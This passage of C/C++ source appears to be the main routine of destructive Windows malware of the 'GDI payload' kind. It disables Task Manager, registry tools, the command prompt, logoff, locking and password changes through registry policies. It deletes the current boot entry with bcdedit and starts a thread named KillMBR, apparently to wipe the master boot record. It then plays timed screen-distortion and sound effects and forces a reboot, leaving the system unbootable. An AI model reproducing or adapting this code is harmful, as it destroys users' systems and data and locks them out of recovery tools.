    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
    reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
    CreateThread(0, 0, KillMBR, 0, 0, 0);
    HANDLE thread0000 = CreateThread(0, 0, mouse, 0, 0, 0);
    Sleep(2500);
    //GDI payload
    HANDLE thread1 = CreateThread(0, 0, gdi1, 0, 0, 0);
    Sleep(5000);
    sound1();
    Sleep(5000);
    HANDLE thread1_1 = CreateThread(0, 0, gdi2, 0, 0, 0);
    Sleep(10000);
    TerminateThread(thread1, 0);
    CloseHandle(thread1);
    TerminateThread(thread1_1, 0);
    CloseHandle(thread1_1);
    RedrawWindow(0, 0, 0, 133);
    sound2();
    HANDLE thread2 = CreateThread(0, 0, gdi3, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    RedrawWindow(0, 0, 0, 133);
    sound3();
    HANDLE thread3 = CreateThread(0, 0, gdi4, 0, 0, 0);
    Sleep(15000);
    HANDLE thread3_1 = CreateThread(0, 0, gdi5, 0, 0, 0);
    Sleep(5000);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    TerminateThread(thread3_1, 0);
    CloseHandle(thread3_1);
    RedrawWindow(0, 0, 0, 133);
    sound4();
    HANDLE thread4 = CreateThread(0, 0, gdi6, 0, 0, 0);
    HANDLE thread4_1 = CreateThread(0, 0, clipping, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    RedrawWindow(0, 0, 0, 133);
    sound5();
    HANDLE thread5 = CreateThread(0, 0, gdi7, 0, 0, 0);
    HANDLE thread5_1 = CreateThread(0, 0, supermamap, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread4_1, 0);
    CloseHandle(thread4_1);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    TerminateThread(thread5_1, 0);
    CloseHandle(thread5_1);
    RedrawWindow(0, 0, 0, 133);
    sound6();
    HANDLE thread6 = CreateThread(0, 0, gdi8, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    RedrawWindow(0, 0, 0, 133);
    sound7();
    HANDLE thread7 = CreateThread(0, 0, gdi9, 0, 0, 0);
    HANDLE thread7_1 = CreateThread(0, 0, mamap, 0, 0, 0);
    HANDLE thread7_2 = CreateThread(0, 0, mamap2, 0, 0, 0);
    HANDLE thread7_3 = CreateThread(0, 0, mamap3, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    TerminateThread(thread7_1, 0);
    CloseHandle(thread7_1);
    TerminateThread(thread7_2, 0);
    CloseHandle(thread7_2);
    TerminateThread(thread7_3, 0);
    CloseHandle(thread7_3);
    RedrawWindow(0, 0, 0, 133);
    sound8();
    HANDLE thread8 = CreateThread(0, 0, gdi10, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread8, 0);
    CloseHandle(thread8);
    RedrawWindow(0, 0, 0, 133);
    sound9();
    HANDLE thread9 = CreateThread(0, 0, gdi11, 0, 0, 0);
    HANDLE thread9_1 = CreateThread(0, 0, mamap4, 0, 0, 0);
    Sleep(10000);
    TerminateThread(thread9, 0);
    CloseHandle(thread9);
    RedrawWindow(0, 0, 0, 133);
    HANDLE thread10 = CreateThread(0, 0, gdi12, 0, 0, 0);
    HANDLE thread10_1 = CreateThread(0, 0, gdi13, 0, 0, 0);
    Sleep(10000);
    TerminateThread(thread10, 0);
    CloseHandle(thread10);
    TerminateThread(thread10_1, 0);
    CloseHandle(thread10_1);
    RedrawWindow(0, 0, 0, 133);
    sound10();
    HANDLE thread11 = CreateThread(0, 0, gdi14, 0, 0, 0);
    HANDLE thread11_1 = CreateThread(0, 0, gdi15, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread11, 0);
    CloseHandle(thread11);
    TerminateThread(thread11_1, 0);
    CloseHandle(thread11_1);
    TerminateThread(thread9_1, 0);
    CloseHandle(thread9_1);
    RedrawWindow(0, 0, 0, 133);
    sound11();
    HANDLE thread12 = CreateThread(0, 0, gdi16, 0, 0, 0);
    HANDLE thread12_1 = CreateThread(0, 0, gdi17, 0, 0, 0);
    HANDLE thread12_2 = CreateThread(0, 0, mouse2, 0, 0, 0);
    HANDLE thread12_3 = CreateThread(0, 0, supermamap2, 0, 0, 0);
    Sleep(20000);
    TerminateThread(thread12, 0);
    CloseHandle(thread12);
    TerminateThread(thread12_1, 0);
    CloseHandle(thread12_1);
    TerminateThread(thread12_3, 0);
    CloseHandle(thread12_3);
    RedrawWindow(0, 0, 0, 133); 
    system("shutdown.exe /r /t 00");
    exit(1);
    while (1) {}
}